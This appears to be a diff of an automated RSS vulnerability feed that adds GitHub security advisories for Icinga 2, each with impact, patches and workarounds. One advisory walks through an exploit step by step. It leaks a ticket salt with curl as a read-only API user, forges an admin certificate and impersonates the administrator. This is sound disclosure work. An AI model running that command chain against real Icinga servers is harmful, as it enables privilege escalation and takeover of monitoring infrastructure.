@@ -7,7 +7,7 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Thu, 16 Jul 2026 06:13:27 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 17 Jul 2026 06:12:13 +0000</lastBuildDate>
     <item>
       <title>[LOW] espocrm/espocrm – Stored XSS in wysiwyg template fields if CSP is disabled</title>
       <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-x5p5-8mxj-9wv6</link>
@@ -1340,6 +1340,81 @@ In 0.10.0:&#13;
 @rexpository</description>
       <guid isPermaLink="false">GHSA-mvx4-532p-xfm9</guid>
       <pubDate>Mon, 29 Jun 2026 23:19:39 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] icinga/icinga2 – Icinga 2 DSL Injection via Unescaped Import Template Name</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-jgqj-x5j9-vgcm</link>
+      <description>### Impact&#13;
+&#13;
+When creating config objects via the `/v1/objects` API endpoint, the template names from the request were written to the resulting Icinga 2 config files without proper sanitization, allowing any `ApiUser` with the permission to create configuration to inject arbitrary configuration that allows them to escalate their privileges.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The following versions of Icinga 2 include fixes for this vulnerability: v2.16.2, v2.15.4, and v2.14.9.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+The vulnerability is only exploitable by API users with any of the `objects/create/*` permissions, so these permissions can be removed from them as a workaround.&#13;
+&#13;
+### References&#13;
+&#13;
+* [Release Announcement](https://icinga.com/blog/icinga2-security-release-v2-16-2/)&#13;
+* [Pull Request with the patch](https://github.com/Icinga/icinga2/pull/10910)&#13;
+&#13;
+### Acknowledgements&#13;
+&#13;
+While working on a release with the fix, this issue was also reported independently by @TristanInSec and @de3erve-hunter.</description>
+      <guid isPermaLink="false">GHSA-jgqj-x5j9-vgcm</guid>
+      <pubDate>Mon, 29 Jun 2026 12:46:07 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] icinga/icinga2 – Stack overflow via deeply nested JSON objects</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-wh38-wg57-5w7g</link>
+      <description>### Impact&#13;
+&#13;
+An attacker can trigger a stack overflow in Icinga 2 by sending crafted JSON. The affected code is also reachable by unauthenticated clients and can be used to crash the Icinga 2 process. Due to the issue being a stack overflow, the possibility of this leading to code execution can't be ruled out, but hasn't been demonstrated yet.&#13;
+&#13;
+**Any Icinga 2 instance that is accessible to an attacker over the network is affected.**&#13;
+&#13;
+### Patches&#13;
+&#13;
+The following versions of Icinga 2 include fixes for this vulnerability: v2.16.2, v2.15.4, and v2.14.9.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+There is no workaround within Icinga 2 for this. Restricting access on the network level so that only trusted users can access Icinga 2 (TCP port 5665) can be done as a mitigation.&#13;
+&#13;
+### References&#13;
+&#13;
+* [Release Announcement](https://icinga.com/blog/icinga2-security-release-v2-16-2/)&#13;
+* [Pull Request with the patch](https://github.com/Icinga/icinga2/pull/10908)</description>
+      <guid isPermaLink="false">GHSA-wh38-wg57-5w7g</guid>
+      <pubDate>Mon, 29 Jun 2026 12:45:28 +0000</pubDate>
+    </item>
+    <item>
+      <title>[CRITICAL] icinga/icinga2 – Improper access control for JSON-RPC update certificate messages</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-vj39-ww8j-vvx5</link>
+      <description>### Impact&#13;
+&#13;
+The code handling certificate update JSON-RPC messages was flawed and did not properly validate the sender of the message, allowing an unauthenticated attacker that can connect to Icinga 2 to update both the own certificate as well as the trusted CA certificate. Updating the trusted CA allows an attacker to impersonate a trusted node, allowing them to take control over the node.&#13;
+&#13;
+**Any Icinga 2 instance that is accessible to an attacker over the network is affected.**&#13;
+&#13;
+### Patches&#13;
+&#13;
+The following versions of Icinga 2 include fixes for this vulnerability: v2.16.2, v2.15.4, and v2.14.9.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+* Restricting access on the network level so that only trusted users can access Icinga 2 (TCP port 5665) can be done as a mitigation.&#13;
+* It is also possible to intentionally break the message handler for certificate updates by removing write access from the certificate directory using `chmod a-w /var/lib/icinga2/certs`. However, **this will also break legitimate certificate renewal, so the remaining certificate validity needs to be monitored and renewals need to be done manually**, also don't forget to add the write permissions (using mode `u+w`) after updating to a fixed version.&#13;
+&#13;
+### References&#13;
+&#13;
+* [Release Announcement](https://icinga.com/blog/icinga2-security-release-v2-16-2/)&#13;
+* [Pull Request with the patch](https://github.com/Icinga/icinga2/pull/10907)</description>
+      <guid isPermaLink="false">GHSA-vj39-ww8j-vvx5</guid>
+      <pubDate>Mon, 29 Jun 2026 12:45:03 +0000</pubDate>
     </item>
     <item>
       <title>[HIGH] zammad/zammad – Arbitrary File Deletion via Unvalidated Session Identifier in Long Polling Controller</title>
@@ -7973,6 +8048,32 @@ Email us at [security@mautic.org](mailto:security@mautic.org)</description>
       <pubDate>Tue, 24 Feb 2026 14:55:11 +0000</pubDate>
     </item>
     <item>
+      <title>[MEDIUM] icinga/icinga2 – Insecure permission of %ProgramData%\icinga2\var on Windows</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-vfjg-6fpv-4mmr</link>
+      <description>### Impact&#13;
+&#13;
+The Icinga 2 MSI did not set appropriate permissions for the `%ProgramData%\icinga2\var` folder on Windows. This resulted in the its contents - including the private key of the user and synced configuration - being readable by all local users. All installations on Windows are affected.&#13;
+&#13;
+Please note that a fix for a similar issue in Icinga for Windows is released at the same time, see [GHSA-88h5-rrm6-5973](https://github.com/Icinga/icinga-powershell-framework/security/advisories/GHSA-88h5-rrm6-5973).&#13;
+&#13;
+### Patches&#13;
+&#13;
+The following fixed versions were released: v2.15.2, v2.14.8, v2.13.14&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+There are two possibilities to work around the issue without upgrading Icinga 2:&#13;
+1. Upgrade Icinga for Windows to at least version v1.13.4, v1.12.4, or v1.11.2. These version will automatically fix the ACLs for the Icinga 2 agent as well.&#13;
+2. Manually update the ACL for the given folder `C:\ProgramData\icinga2\var` (and `C:\Program Files\WindowsPowerShell\modules\icinga-powershell-framework\certificate` to fix the issue for the Icinga for Windows as well) including every sub-folder and item to restrict access for general users, only allowing the Icinga service user and administrators access.&#13;
+&#13;
+### References&#13;
+&#13;
+- [Release announcement blog post](https://icinga.com/blog/releasing-icinga-2-v2-15-2-v2-14-8-v2-13-14-and-icinga-for-windows-v1-13-4-v1-12-4-v1-11-2/)&#13;
+- Related Icinga for Windows issue: [GHSA-88h5-rrm6-5973](https://github.com/Icinga/icinga-powershell-framework/security/advisories/GHSA-88h5-rrm6-5973)</description>
+      <guid isPermaLink="false">GHSA-vfjg-6fpv-4mmr</guid>
+      <pubDate>Thu, 29 Jan 2026 13:18:17 +0000</pubDate>
+    </item>
+    <item>
       <title>[HIGH] RocketChat/Rocket.Chat – Unauthorized Access to OAuth App Details (Versions ≤ 6.12.0)</title>
       <link>https://github.com/RocketChat/Rocket.Chat/security/advisories/GHSA-g4wm-fg3c-g4p2</link>
       <description>### Summary&#13;
@@ -8075,6 +8176,79 @@ A low-privileged user of the platform can install malicious code to obtain highe
       <description>Taiga API is vulnerable to Time‑based blind SQL injection allowing sensitive data disclosure via response timing.</description>
       <guid isPermaLink="false">GHSA-chm9-9wwq-xffj</guid>
       <pubDate>Tue, 28 Oct 2025 11:49:58 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] icinga/icinga2 – Signals sent as root to processes based on PID file written by the Icinga 2 daemon user</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-pg6g-g99v-mw46</link>
+      <description>### Impact&#13;
+&#13;
+The `safe-reload` script (also used during `systemctl reload icinga2`) and logrotate configuration shipped with Icinga 2 read the PID of the main Icinga 2 process from a PID file writable by the daemon user, but send the signal as the root user. This can allow the Icinga user to send signals to processes it would otherwise not permitted to.&#13;
+&#13;
+### Patches&#13;
+&#13;
+A fix is included in the following Icinga 2 versions: 2.15.1, 2.14.7, and 2.13.13.&#13;
+&#13;
+&gt; [!WARNING]  &#13;
+&gt; The fix to the logrotate configuration is inside the `/etc/logrotate.d/icinga2` file. This file is tracked as a configuration file by package manager and may not be updated automatically if that file was modified locally. After upgrading, make sure to check if there are any files with an extension like `.dpkg-dist` or `.rpmnew` next to it. If so, you need to incorporate the changes into your configuration manually.&#13;
+&gt;&#13;
+&gt; If the file uses the command `"$DAEMON" internal signal --sig SIGHUP --pid "$pid"` (instead of `kill -HUP "$pid"`), it was upgraded correctly.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+Both problems arise from calling the `kill` binary from shell scripts or configuration files. These can also be changed without upgrading the Icinga 2 packages. This can be used to temporarily disable these actions (at the cost of functionality).&#13;
+&#13;
+### References&#13;
+* [Security Release Announcement](https://icinga.com/blog/releasing-icinga-2-v2-15-1-2-14-7-and-2-13-13-and-icinga-db-web-v1-2-3-and-1-1-4)&#13;
+* Source code patch: https://github.com/Icinga/icinga2/commit/51ec73cbd922a76fc0f60e1d8d33acd7caa5d587&#13;
+* Original report: https://github.com/Icinga/icinga2/issues/10527</description>
+      <guid isPermaLink="false">GHSA-pg6g-g99v-mw46</guid>
+      <pubDate>Thu, 16 Oct 2025 12:16:40 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] icinga/icinga2 – Denial of Service (DoS) By Dereferencing Invalid Reference</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-v9jg-xqhj-f43g</link>
+      <description>### Impact&#13;
+&#13;
+When creating an invalid [reference](https://icinga.com/docs/icinga-2/latest/doc/17-language-reference/#references), such as a reference to [`null`](https://icinga.com/docs/icinga-2/latest/doc/17-language-reference/#null-value), dereferencing results in a segmentation fault. This can be used by any API user with access to an API endpoint that allows specifying a filter expression to crash the Icinga 2 daemon.&#13;
+&#13;
+### Patches&#13;
+&#13;
+A fix is included in the following Icinga 2 versions: 2.15.1, 2.14.7, and 2.13.13.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+The weakness can only be exploited by authenticated API users, thus API access can be limited to trusted users only. There is no practical workaround to prevent authenticated users from exploiting it because it would require removing permissions from that user that grant access to endpoints that accept filter expressions (which includes `/v1/actions` and `/v1/objects`).&#13;
+&#13;
+### References&#13;
+- Introduced in Icinga 2.10.0, #6521.&#13;
+- [Security Release Announcement](https://icinga.com/blog/releasing-icinga-2-v2-15-1-2-14-7-and-2-13-13-and-icinga-db-web-v1-2-3-and-1-1-4)</description>
+      <guid isPermaLink="false">GHSA-v9jg-xqhj-f43g</guid>
+      <pubDate>Thu, 16 Oct 2025 12:16:21 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] icinga/icinga2 – API users could access restricted values in filter expressions</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-gg32-w9rm-vp2v</link>
+      <description>### Impact&#13;
+&#13;
+Filter expressions provided to the various `/v1/objects` could access variables or objects that would otherwise be inaccessible for the user. This can allow authenticated API users to learn information that should be hidden from them.&#13;
+&#13;
+### Patches&#13;
+&#13;
+A fix is included in the following Icinga 2 versions: 2.15.1, 2.14.7, and 2.13.13.&#13;
+&#13;
+In order to fix this, the following changes for filter expressions supplied in API request:&#13;
+- Global variables can only be used in filter expressions if the user is allowed to see them according to the `variables` permission (as used by `/v1/variables`).&#13;
+- The `get_object()` function now only returns an object if the user is allowed to see it according tot he corresponding `objects/query/&lt;type&gt;` permission (as used by `/v1/objects`).&#13;
+- The following function can no longer be used in API filter expressions: `get_objects()`, `get_template()`, `get_templates()`, `getenv()`.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+The weakness can only be exploited by authenticated API users, thus API access can be limited to trusted users only. There is no practical workaround to prevent authenticated users from exploiting it because it would require removing permissions from that user that grant access to endpoints that accept filter expressions (which includes `/v1/actions` and `/v1/objects`).&#13;
+&#13;
+### References&#13;
+- [Security Release Announcement](https://icinga.com/blog/releasing-icinga-2-v2-15-1-2-14-7-and-2-13-13-and-icinga-db-web-v1-2-3-and-1-1-4)</description>
+      <guid isPermaLink="false">GHSA-gg32-w9rm-vp2v</guid>
+      <pubDate>Thu, 16 Oct 2025 12:16:02 +0000</pubDate>
     </item>
     <item>
       <title>[MEDIUM] espocrm/espocrm – Stored SVG &lt;a&gt; Injection Enabling CSRF-Based Arbitrary User Creation</title>
@@ -8782,6 +8956,45 @@ Mautic has patched this vulnerability by enforcing proper permission checks on p
       <pubDate>Wed, 28 May 2025 16:07:44 +0000</pubDate>
     </item>
     <item>
+      <title>[CRITICAL] icinga/icinga2 – Certificate renewal might incorrectly renew an invalid certificate</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-7vcf-f5v9-3wr6</link>
+      <description>### Impact&#13;
+&#13;
+&gt; [!NOTE]&#13;
+&gt; If Icinga 2 is built with OpenSSL 1.1.0 (released in 2016) or later, it is **NOT** affected by this issue.&#13;
+&gt; This can be checked by running `icinga2 --version | grep OpenSSL`.&#13;
+&#13;
+The `VerifyCertificate()` function can be tricked into incorrectly treating certificates as valid. This allows an attacker to send a malicious certificate request that is then treated as a renewal of an already existing certificate, resulting in the attacker obtaining a valid certificate that can be used to impersonate trusted nodes.&#13;
+&#13;
+For this to be exploited, a direct TLS connection to a master capable of signing certificates is required. The bug can also be triggered on other nodes. On these, it only results in an incorrect "Received certificate request for CN '[...]' signed by our CA." log message before forwarding the request. That forwarded request is then handled correctly by the master and doesn't trigger the issue.&#13;
+&#13;
+This only happens with OpenSSL older than version 1.1.0 as it stored a valid flag in the certificate that causes some steps of the verification operation to be skipped. In case this flag is set from a previous operation, this can lead to an incorrect result. The flag in question was [removed in OpenSSL 1.1.0](https://github.com/openssl/openssl/commit/0e76014e584ba78ef1d6ecb4572391ef61c4fb51), so if Icinga 2 is built with that or a later version, the certificate is always verified completely and the problem doesn't occur.&#13;
+&#13;
+Note that for example RHEL 7 and derivatives like Amazon Linux 2 ship OpenSSL 1.0.2, hence Icinga 2 is vulnerable on these platforms.&#13;
+&#13;
+### Patches&#13;
+The problem has been fixed in the following versions:&#13;
+* [2.14.6](https://github.com/Icinga/icinga2/releases/tag/v2.14.6)&#13;
+* [2.13.12](https://github.com/Icinga/icinga2/releases/tag/v2.13.12)&#13;
+* [2.12.12](https://github.com/Icinga/icinga2/releases/tag/v2.12.12)&#13;
+&#13;
+Users are advised to upgrade Icinga 2 to a fixed version on masters running with OpenSSL 1.0.2 or older immediately.&#13;
+&#13;
+The source code for the new versions can be found in our [Git repository](https://github.com/Icinga/icinga2/releases). Updated binary packages are available on [packages.icinga.com](https://packages.icinga.com/).&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+For this to be exploited, a direct TLS connection to a master capable of signing certificates is required, giving two options for a workaround:&#13;
+1. Restrict network access to the masters to only trusted entities.&#13;
+2. Stop the master from signing any new certificates. This can be achieved by renaming the `/var/lib/icinga2/ca` directory. Note that this will prevent you from setting up new nodes as well as prevent existing nodes from renewing their certificates. Certificates are renewed around 30 days before their expiry date, so that's only a short-term solution as certificates will eventually expire otherwise.&#13;
+&#13;
+### References&#13;
+* [Release Announcement](https://icinga.com/blog/cve-2025-48057)&#13;
+* Patches (source code): [master branch](https://github.com/Icinga/icinga2/commit/4023128be42b18a011dda71ddee9ca79955b89cb), [v2.14.6](https://github.com/Icinga/icinga2/commit/9ad5683aab9eb392c6737ff46c830a945c9e240f), [v2.13.12](https://github.com/Icinga/icinga2/commit/60f75f4a3d5cbb234eb3694ba7e9076a1a5b8776), [v2.12.12](https://github.com/Icinga/icinga2/commit/9b2c05d0cc09210bdeade77cf9a73859250fc48d) (requires a [second patch](https://github.com/Icinga/icinga2/commit/34c93a2542bbe4e9886d15bc17ec929ead1aa152) as a dependency)</description>
+      <guid isPermaLink="false">GHSA-7vcf-f5v9-3wr6</guid>
+      <pubDate>Tue, 27 May 2025 11:52:11 +0000</pubDate>
+    </item>
+    <item>
       <title>[MEDIUM] espocrm/espocrm – HTML Injection into phishing leads to account takeover</title>
       <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-qrwp-v8v3-hqp2</link>
       <description>### Summary&#13;
@@ -9043,6 +9256,57 @@ Fixed with commit https://github.com/argoproj/argo-cd/commit/6f5537bdf15ddbaa0f2
 </description>
       <guid isPermaLink="false">GHSA-47g2-qmh2-749v</guid>
       <pubDate>Thu, 30 Jan 2025 13:27:52 +0000</pubDate>
+    </item>
+    <item>
+      <title>[CRITICAL] icinga/icinga2 – TLS Certificate Validation Bypass for JSON-RPC and HTTP API Connections</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-j7wq-r9mg-9wpv</link>
+      <description>### Impact&#13;
+&#13;
+The TLS certificate validation in all Icinga 2 versions starting from 2.4.0 was flawed, allowing an attacker to impersonate both trusted cluster nodes as well as any API users that use TLS client certificates for authentication (`ApiUser` objects with the `client_cn` attribute set).&#13;
+&#13;
+By impersonating a trusted cluster node like a master or satellite, an attacker can supply a malicious configuration update to other nodes (if the `accept_config` attribute of the `ApiListener` object is set to true) or instruct the other node to execute malicious commands directly (if `the accept_commands` attribute of the `ApiListener` object is set to true). These attributes are expected to be set in most distributed installations, but in case they are not, an attacker can still retrieve potentially sensitive information.&#13;
+&#13;
+When impersonating API users, the impact depends on the permissions configured for the individual users using certificate authentication. This may include permissions like updating the configuration and executing commands as well.&#13;
+&#13;
+We expect most installations to be affected by this vulnerability and recommend upgrading as soon as possible.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The following fixed versions were released:&#13;
+&#13;
+- v2.14.3&#13;
+- v2.13.10&#13;
+- v2.12.11&#13;
+- v2.11.12&#13;
+&#13;
+The source code for the new versions can be found in our [Git repository](https://github.com/Icinga/icinga2/releases). Updated binary packages are available on [packages.icinga.com](https://packages.icinga.com/) and the Icinga for Windows repository. Updated container images are available on [Docker Hub](https://hub.docker.com/r/icinga/icinga2/tags). Updated Helm Charts are provided in the corresponding [repository](https://github.com/Icinga/helm-charts/tree/main/charts/icinga-stack).&#13;
+&#13;
+Given the severity of the issue, users are advised to upgrade immediately.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+There is no known way to work around this in Icinga 2. Access to the Icinga 2 API port can be restricted using firewalls to reduce the impact.&#13;
+&#13;
+### Details&#13;
+&#13;
+In order to allow some time for patching, the full report with more details on the vulnerability including how to reproduce it will be released in two weeks on 2024-11-26.&#13;
+&#13;
+### Acknowledgements&#13;
+&#13;
+We would like to thank [Finn Steglich](https://github.com/fsteglich) for finding and reporting this issue.&#13;
+&#13;
+### References&#13;
+&#13;
+- [Announcement on icinga.com](https://icinga.com/blog/2024/11/12/critical-icinga-2-security-releases-2-14-3)&#13;
+- Patch (source code): [master branch](https://github.com/Icinga/icinga2/commit/869a7d6f0fe38c748e67bacc1fbdd42c933030f6), [v2.14.3](https://github.com/Icinga/icinga2/commit/2febc5e18ae0c93d989e64ebc2a9fd90e7205ad8), [v2.13.10](https://github.com/Icinga/icinga2/commit/3504fc7ed688c10d86988e2029a65efc311393fe), [v2.12.11](https://github.com/Icinga/icinga2/commit/0419a2c36de408e9a703aec0962061ec9a285d3c), [v2.11.12](https://github.com/Icinga/icinga2/commit/8fed6608912c752b337d977f730547875a820831)&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory, please ask in our [community forum](https://community.icinga.com/) or email us at [info@icinga.com](mailto:info@icinga.com).&#13;
+&#13;
+For reporting possible security issues, please see [the information on our website](https://icinga.com/company/contact/security-issues/).</description>
+      <guid isPermaLink="false">GHSA-j7wq-r9mg-9wpv</guid>
+      <pubDate>Tue, 12 Nov 2024 14:02:24 +0000</pubDate>
     </item>
     <item>
       <title>[HIGH] mautic/mautic – XSS in contact/company tracking (no authentication)</title>
@@ -10475,6 +10739,188 @@ None&#13;
       <pubDate>Tue, 05 Oct 2021 07:54:53 +0000</pubDate>
     </item>
     <item>
+      <title>[LOW] icinga/icinga2 – Missing TLS server certificate validation in ElasticsearchWriter, GelfWriter, InfluxdbWriter and Influxdb2Writer</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-cxfm-8j5v-5qr2</link>
+      <description>### Impact&#13;
+&#13;
+Despite a CA is specified, none of ElasticsearchWriter, GelfWriter, InfluxdbWriter and Influxdb2Writer verify the server's certificate.&#13;
+&#13;
+### Patches&#13;
+&#13;
+Icinga 2 instances which connect to any of the mentioned TSDBs using TLS over a spoofable infrastructure should immediately upgrade and change the credentials (if any) used by the TSDB writer feature to authenticate against the TSDB.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+None.&#13;
+&#13;
+### References&#13;
+&#13;
+Blogpost: https://icinga.com/blog/2021/08/19/icinga-2-13-1-security-release/&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+* Email us at security@icinga.com</description>
+      <guid isPermaLink="false">GHSA-cxfm-8j5v-5qr2</guid>
+      <pubDate>Thu, 19 Aug 2021 11:54:15 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] icinga/icinga2 – Results of queries for ApiListener objects include the ticket salt which allows in turn to steal (more privileged) identities</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-98wp-jc6q-x5q5</link>
+      <description>### Impact&#13;
+&#13;
+Alice operates a regular master instance with a read-ony API user. Let's say for a dashboard.&#13;
+&#13;
+```&#13;
+object ApiUser "r/o" {&#13;
+  password = "123456"&#13;
+  permissions = [ "objects/query/*" ]&#13;
+}&#13;
+```&#13;
+&#13;
+For better demonstration there's also an administrator with all possible permissions. To be as secure as possible, that user is authenticated by an X.509 certificate, not by a password.&#13;
+&#13;
+```&#13;
+object ApiUser "admin" {&#13;
+  client_cn = "admin"&#13;
+  permissions = [ "*" ]&#13;
+}&#13;
+```&#13;
+&#13;
+With the read-ony user's credentials Eve can view most attributes of all config objects including `ticket_salt` of `ApiListener`.&#13;
+&#13;
+```&#13;
+root@eve:~$ curl -fksSLu r/o:123456 'https://10.211.55.58:5665/v1/objects/apilisteners?attrs=ticket_salt'&#13;
+{"results":[{"attrs":{"ticket_salt":"7aa3ae9f1df6d6137fdc71831bfcd94a"},"joins":{},"meta":{},"name":"api","type":"ApiListener"}]}&#13;
+```&#13;
+&#13;
+This salt is enough to compute a ticket for every possible CN.&#13;
+&#13;
+```&#13;
+root@eve:~# icinga2 pki ticket --cn admin --salt 7aa3ae9f1df6d6137fdc71831bfcd94a&#13;
+f8dabbb9acd2a92a16b65ee6cadd698b07e0f7b8&#13;
+```&#13;
+&#13;
+A such ticket, the master node's certificate, and a self-signed certificate are in turn enough to successfully [request the desired certificate](https://icinga.com/docs/icinga-2/latest/doc/06-distributed-monitoring/#csr-auto-signing) from Icinga.&#13;
+&#13;
+```&#13;
+root@eve:~# icinga2 pki save-cert --trustedcert /tmp/alice.crt --host 10.211.55.58 --port 5665 -x warning&#13;
+(...)&#13;
+root@eve:~# icinga2 pki new-cert --cn admin --key /tmp/admin.key --csr /tmp/admin.csr --cert /tmp/admin.crt -x warning&#13;
+root@eve:~# icinga2 pki request --key /tmp/admin.key --cert /tmp/admin.crt --ca /tmp/ca.crt --trustedcert /tmp/alice.crt --host 10.211.55.58 --port 5665 --ticket f8dabbb9acd2a92a16b65ee6cadd698b07e0f7b8 -x warning&#13;
+```&#13;
+&#13;
+And that certificate may in turn be used to steal an endpoint or API user's identity.&#13;
+&#13;
+```&#13;
+root@eve:~# curl -fksSL --cert /tmp/admin.crt --key /tmp/admin.key 'https://10.211.55.58:5665/v1?pretty=1'&#13;
+{&#13;
+    "results": [&#13;
+        {&#13;
+            "info": "More information about API requests is available in the documentation at https://icinga.com/docs/icinga2/latest/",&#13;
+            "permissions": [&#13;
+                "*"&#13;
+            ],&#13;
+            "user": "admin",&#13;
+            "version": "r2.12.4-1"&#13;
+        }&#13;
+    ]&#13;
+}&#13;
+```&#13;
+&#13;
+### Patches&#13;
+&#13;
+Users should immediately upgrade to v2.12.5 or (if not possible) to v2.11.10. Both of them fix the vulnerability.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+Either specify queryable types explicitly.&#13;
+&#13;
+```&#13;
+object ApiUser "r/o" {&#13;
+  password = "123456"&#13;
+  permissions = [ "objects/query/Host", "objects/query/Service" ]&#13;
+}&#13;
+```&#13;
+&#13;
+Or filter out ApiListener objects.&#13;
+&#13;
+```&#13;
+object ApiUser "r/o" {&#13;
+  password = "123456"&#13;
+  permissions = [ {&#13;
+    permission = "objects/query/*"&#13;
+    filter = {{ obj.type != "ApiListener" }}&#13;
+  } ]&#13;
+}&#13;
+```&#13;
+&#13;
+### References&#13;
+&#13;
+* https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+* Email us at [security(at)icinga.com](mailto:security@icinga.com)</description>
+      <guid isPermaLink="false">GHSA-98wp-jc6q-x5q5</guid>
+      <pubDate>Thu, 15 Jul 2021 09:13:46 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] icinga/icinga2 – Passwords used to access external services inadvertently exposed through API</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-wrpw-pmr8-qgj7</link>
+      <description>### Impact&#13;
+&#13;
+Some of the Icinga 2 features that require credentials for external services exposed those through the API. The following features inadvertently exposed these credentials to authenticated API users with read permissions for the corresponding object types:&#13;
+* *IdoMysqlConnection* and *IdoPgsqlConnection* (every released version): password of the user used to connect to the database&#13;
+* *IcingaDB* (added in 2.12.0): password used to connect to the Redis server&#13;
+* *ElasticsearchWriter* (added in 2.8.0): password used to connect to the Elasticsearch server&#13;
+&#13;
+An attacker who obtained these credentials can impersonate Icinga to these services and add, modify and delete information there. If credentials with more permissions are in use, this increases the impact accordingly.&#13;
+&#13;
+&#13;
+### Patches&#13;
+&#13;
+Starting with the 2.11.10 and 2.12.5 releases, these passwords are no longer exposed via the API.&#13;
+&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+API user permissions can be restricted to not allow querying of any affected objects. Either by explicitly listing only the required object types for object query permissions:&#13;
+```&#13;
+object ApiUser "example" {&#13;
+  password = "secret"&#13;
+  permissions = [ "objects/query/Host", "objects/query/Service" ]&#13;
+}&#13;
+```&#13;
+&#13;
+Or by applying a filter rule:&#13;
+```&#13;
+object ApiUser "example" {&#13;
+  password = "secret"&#13;
+  permissions = [ {&#13;
+    permission = "objects/query/*"&#13;
+    filter = {{ ! ["IdoMysqlConnection", "IdoPgsqlConnection", "IcingaDB", "ElasticsearchWriter"].contains(obj.type) }}&#13;
+  } ]&#13;
+}&#13;
+```&#13;
+&#13;
+&#13;
+### References&#13;
+* https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/&#13;
+&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+* Email us at [security@icinga.com](mailto:security@icinga.com)&#13;
+</description>
+      <guid isPermaLink="false">GHSA-wrpw-pmr8-qgj7</guid>
+      <pubDate>Thu, 15 Jul 2021 09:12:39 +0000</pubDate>
+    </item>
+    <item>
       <title>[HIGH] composer/composer – Missing argument delimiter can lead to command execution via VCS repository URLs or source download URLs on systems with Mercurial</title>
       <link>https://github.com/composer/composer/security/advisories/GHSA-h5h8-pc6h-jvvx</link>
       <description>URLs for Mercurial repositories in the root composer.json and package source download URLs are not sanitized correctly. Specifically crafted URL values allow commands to be executed in the HgDriver if hg/Mercurial is installed on the system.&#13;
@@ -10489,6 +10935,18 @@ None&#13;
 </description>
       <guid isPermaLink="false">GHSA-h5h8-pc6h-jvvx</guid>
       <pubDate>Tue, 27 Apr 2021 11:17:42 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] icinga/icinga2 – Revoked certificates due for renewal will automatically be renewed ignoring the CRL</title>
+      <link>https://github.com/Icinga/icinga2/security/advisories/GHSA-pcmr-2p2f-r7j6</link>
+      <description>### Impact&#13;
+Revoked certificates due for renewal will automatically be renewed ignoring the CRL.&#13;
+&#13;
+When a CRL is specified in the ApiListener configuration, Icinga 2 only used it when connections were established so far, but not when a certificate is requested. This allows a node to automatically renew a revoked certificate if it meets the other conditions for auto renewal (issued before 2017 or expires in less than 30 days).&#13;
+&#13;
+Because Icinga 2 currently (v2.12.3 and earlier) uses a validity duration of 15 years, this only affects setups with external certificate signing and revoked certificates that expire in less then 30 days.</description>
+      <guid isPermaLink="false">GHSA-pcmr-2p2f-r7j6</guid>
+      <pubDate>Tue, 15 Dec 2020 13:26:39 +0000</pubDate>
     </item>
   </channel>
 </rss>
